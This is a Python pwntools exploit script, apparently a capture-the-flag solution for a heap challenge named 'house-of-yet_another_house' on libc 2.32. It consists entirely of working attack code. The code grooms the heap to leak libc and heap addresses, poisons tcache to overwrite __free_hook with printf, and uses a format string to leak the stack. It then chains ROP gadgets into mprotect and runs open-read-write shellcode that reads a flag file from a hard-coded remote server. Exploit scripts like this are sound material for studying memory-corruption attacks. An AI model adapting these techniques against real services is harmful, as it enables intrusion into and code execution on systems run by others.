#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import struct
import random
import subprocess

# Utils
def add(size,data=None):
	global index
	for i in range(len(index)):
		if index[i] == None:
			d = i
			break
	index[i] = d
	io.sendafter('| ','1')
	io.sendafter('Size: ',f'{size}')
	print(f'[+] Alloc: {hex(size)}, Index: {i}')
	if data is not None:
		io.sendafter('Data: ',data)
	else:
		io.sendafter('Data: ','\1')

def delete(idx):
	global index
	io.sendafter('| ','2')
	io.sendafter('Index: ',f'{idx}')
	print(f'[+] Delete: {idx}')
	index[idx] = None

def view(idx):
	io.sendafter('| ','3')
	io.sendafter('Index: ',f'{idx}')
	return io.recvline().strip()

def edit(idx,data):
	io.sendafter('> ','4')
	io.sendafter('Index: ',f'{idx}')
	io.send(data)
	return

def defuscate(x,l=64):
	p = 0
	for i in range(l*4,0,-4): # 16 nibble
		v1 = (x & (0xf << i )) >> i
		v2 = (p & (0xf << i+12 )) >> i+12
		p |= (v1 ^ v2) << i
	return p

def mask(heap_base,target):
	return (heap_base >> 0xc) ^ target

# Addr
largebin_offset = 0x1bf0b0
main_arena = 0x1beba0
smallbin_offset = 0x1bedf0
tcache_max_bins = 0x1be2d0
__free_hook = 0x1c1b60
printf = 0x57c70

# Gadgets
L_POP_RDI = 0x0012f696
L_POP_RSI = 0x0012c43d
L_POP_RDX = 0x00089972
L_POP_RAX = 0x000b9317
L_SYSCALL = 0x000cbd29

# Exp
def pwn():
	global io

	add(0x148,(b'\2'*0x58 +p64(0) ).ljust(0x148,b'\2')) #0
        
	add(0x4f8,b'\1'*0x4f8) #1
	add(0x1f8) #2
	add(0x4f8) #3
	add(0x4f8) #4
	add(0x1f8) #5 
	add(0x4f8) #6
	add(0x4f8) #7 
	add(0x1f8) #8
	delete(1)
	delete(4)
	delete(7)
	delete(3)
	add(0x528,b'\0'*0x4f8+p64(0x701)) #1
	add(0x4c8) #3
	add(0x4f8) #4
	add(0x4f8) #7
	delete(7)
	delete(3)
	delete(4)
	delete(6)
	add(0x528,b'\1'*0x4f8+p64(0x501)+b'\0') #3
	add(0x4c8) #4
	add(0x4f8) #6
	add(0x4c8) #7
	delete(6)
	delete(7)
	add(0x4f8,'HKHKHKHKH') #6
	add(0x4c8) #7

	edit(5,b'\1'*0x1f0+p64(0x700))
	delete(3)
	add(0x4f8) #3
	add(0x818) #9
	delete(9)
	libc_leak = u64(view(5).ljust(8,b'\0'))
	libc_base = libc_leak - largebin_offset
	log.info(f'Libc base: {hex(libc_base)}')
	add(0x1f8) #9
	delete(2)
	delete(5)
	heap_base = defuscate(u64(view(9).ljust(8,b'\0'))) - 0x910
	log.info(f'Heap base: {hex(heap_base)}')
	
	add(0x4f8) #2
	delete(1)
	add(0x528,p64(0)+ (b'A'*(0x4b0-0xf0))+p64(libc_base+__free_hook)+p64(0)+p64(heap_base+0xed0) ) #1 ## Fake __free_hook entry
	for i in xrange(7): #5, 10 - 15
		add(0x1f8)
	delete(3)
	add(0x4f8,b'\1'*0x28+p64(0xbd1)) #3
	delete(7)
	add(0xbc8,b'\1'*0x4c8+p64(0x201)+b'\1'*0x1f8+p64(0x1001) ) #7
	delete(2)
	add(0xff8,b'\1'*0x4f8+p64(0x501)+p64(0)*5 +\
		p64(0x4d1)+b'\1'*0x4c8+p64(0x201)+b'\1'*0x1f8+\
		p64(0x201)+b'\1'*0x1f8+p64(0x201) +\
		b'\1'*0x1f8 ) #2
	for i in xrange(3): #16~18
		add(0x1f8,'\1')
	for i in xrange(12,19):
		delete(i)
	delete(8)
	add(0x508) #8
	delete(2)	
	add(0xff8,b'\1'*0x4f8+p64(0x501)+p64(0)*5 +\
		p64(0x4d1)+b'\1'*0x4c8+p64(0x201)+\
		p64(libc_base+smallbin_offset)+p64(heap_base+0x2110)+\
		p64(heap_base+0x2100)+p64(heap_base+0x2120)+\
		p64(0)+p64(heap_base+0x2130)+\
		p64(0)+p64(heap_base+0x2140)+\
		p64(0)+p64(heap_base+0x2150)+\
		p64(0)+p64(heap_base+0x2160)+\
		p64(0)+p64(heap_base+0x2170)+\
		p64(0)+p64(libc_base+tcache_max_bins-0x10) ) #2
	add(0x1f8,b'%15$p\n\0\0'+\
		asm(f'''
			xor rax,rax
			mov rax, 2
			mov rdi, {heap_base+0x216f}
			mov rsi, 0
			syscall
			mov rbx, rax
			mov rax, 0
			mov rdi, rbx
			mov rdx, 0xf0
			mov rsi, {heap_base}
			syscall
			mov rax, 1
			mov rdi, 1
			mov rsi, {heap_base}
			syscall
		''',arch='amd64')+b'/home/challenge/flag.txt\0'
	) #12

	delete(1)	
	log.info("Overwriting __free_hook with printf and do format string to leak stack ^^")	
	add(0x1f88-(0x2e0),p64(libc_base+printf)) #1
	delete(12)	
	stack_leak = int(io.recvline().strip(),0)
	log.info(f'Stack: {hex(stack_leak)}')	
	log.info("Craft fake stack entry in tcache and do ROP to mprotect and finally ORW.^^")
	add(0x1f88-(0x2c8),p64(0)+p64(stack_leak-0x148)) #12 Add fake stack entry in tcache.
	add(0x1f88-(0x2e0),p64(heap_base)*3+p64(libc_base+L_POP_RDI)+p64(heap_base)+p64(libc_base+L_POP_RSI)+p64(0x21000)+\
		p64(libc_base+L_POP_RAX)+p64(0xa)+\
		p64(libc_base+L_POP_RDX)+p64(7)+p64(libc_base+L_SYSCALL)+\
		p64(heap_base+0x2118) ) #13
        
# Pwn
if __name__=='__main__':
#	io = process('./house-of-yet_another_house',env={'LD_PRELOAD':'./libc-2.32.so'})
#	io = remote('localhost',49153)
#	io = remote('localhost',49154)
	io = remote('69.90.132.248', 11000)
	index = [None] * 19
	pwn()
	io.interactive()
